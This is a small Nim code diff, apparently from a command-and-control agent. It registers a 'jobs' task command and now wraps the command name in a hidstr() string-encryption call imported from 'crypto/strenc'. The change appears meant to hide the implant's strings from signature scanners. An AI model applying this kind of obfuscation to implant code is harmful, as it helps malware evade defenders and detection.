@@ -2,6 +2,7 @@ import std/[json, strutils]
 import core/types
 import core/jobs
 import commands/registry
+import crypto/strenc
 
 proc jobsExecute(taskId: string, params: JsonNode, state: AgentState,
                  send: SendMsg): TaskResult =
@@ -15,4 +16,4 @@ proc jobsExecute(taskId: string, params: JsonNode, state: AgentState,
   return TaskResult(output: lines.join("\n"), status: "success", completed: true)
 
 proc initJobs*() =
-  register("jobs", jobsExecute)
+  register(hidstr("jobs"), jobsExecute)
